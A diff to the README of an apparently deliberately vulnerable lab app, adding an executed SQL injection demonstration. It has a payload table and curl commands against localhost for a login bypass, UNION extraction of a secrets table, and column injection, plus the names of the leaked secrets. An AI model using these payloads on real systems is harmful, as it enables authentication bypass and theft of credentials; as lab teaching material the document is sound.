@@ -119,6 +119,68 @@ const query = `SELECT id, title, content FROM records WHERE title LIKE '%${query
 - Implement input validation
 - Re-run Phase 2 payloads to verify fixes
 
+## Phase 2 Attack Demonstration (Executed)
+
+The following attacks were executed against the running lab environment.
+
+### Environment Status
+- Frontend: `http://localhost:3000`
+- Backend: `http://localhost:5000`
+- MySQL host port: `3307` (container port `3306`)
+
+### Attack Evidence Summary
+
+| Test Case | Endpoint | Payload | Result |
+|---|---|---|---|
+| Login baseline | `POST /api/auth/login` | `username=admin`, `password=wrongpass` | `401` (failed login) |
+| Login SQLi bypass | `POST /api/auth/login` | `username=admin' OR '1'='1 -- ` | `200` (logged in as `admin`) |
+| Search baseline | `GET /api/search` | `query=Welcome` | `200`, no records |
+| Search UNION SQLi | `GET /api/search` | `query=' UNION SELECT id, secret_key, secret_value FROM secrets -- ` | `200`, leaked rows from `secrets` |
+| Advanced baseline | `GET /api/search/advanced` | `column=title`, `value=Project` | `200`, normal filtered row |
+| Advanced SQLi (column injection) | `GET /api/search/advanced` | `column=title OR '1'='1' -- `, `value=x` | `200`, returned all records (filter bypass) |
+| Advanced SQLi (UNION via value) | `GET /api/search/advanced` | `column=title`, `value=' UNION SELECT id, secret_key, secret_value, 'attacker', 1, NOW() FROM secrets -- ` | `200`, leaked `secrets` table data |
+
+### Reproduction Commands
+
+```bash
+# 1) Login baseline (should fail)
+curl -s -X POST http://localhost:5000/api/auth/login \
+   -H "Content-Type: application/x-www-form-urlencoded" \
+   --data-urlencode "username=admin" \
+   --data-urlencode "password=wrongpass"
+
+# 2) Login SQL injection bypass (should succeed)
+curl -s -X POST http://localhost:5000/api/auth/login \
+   -H "Content-Type: application/x-www-form-urlencoded" \
+   --data-urlencode "username=admin' OR '1'='1 -- " \
+   --data-urlencode "password=anything"
+
+# 3) Basic search UNION extraction
+curl -s -G http://localhost:5000/api/search \
+   --data-urlencode "query=' UNION SELECT id, secret_key, secret_value FROM secrets -- "
+
+# 4) Advanced search column injection (tautology)
+curl -s -G http://localhost:5000/api/search/advanced \
+   --data-urlencode "column=title OR '1'='1' -- " \
+   --data-urlencode "value=x"
+
+# 5) Advanced search UNION extraction with matching column count
+curl -s -G http://localhost:5000/api/search/advanced \
+   --data-urlencode "column=title" \
+   --data-urlencode "value=' UNION SELECT id, secret_key, secret_value, 'attacker', 1, NOW() FROM secrets -- "
+```
+
+### Observed Sensitive Data Exposure
+
+UNION-based SQL injection returned secret values such as:
+- `api_key_payment`
+- `api_key_cloud`
+- `db_backup_password`
+- `jwt_secret`
+- `admin_api_token`
+
+This confirms successful data exfiltration from a non-target table (`secrets`) and demonstrates high-impact SQL injection vulnerabilities.
+
 ## Important Notes
 
 ⚠️ **This is deliberately vulnerable code for educational purposes only.**
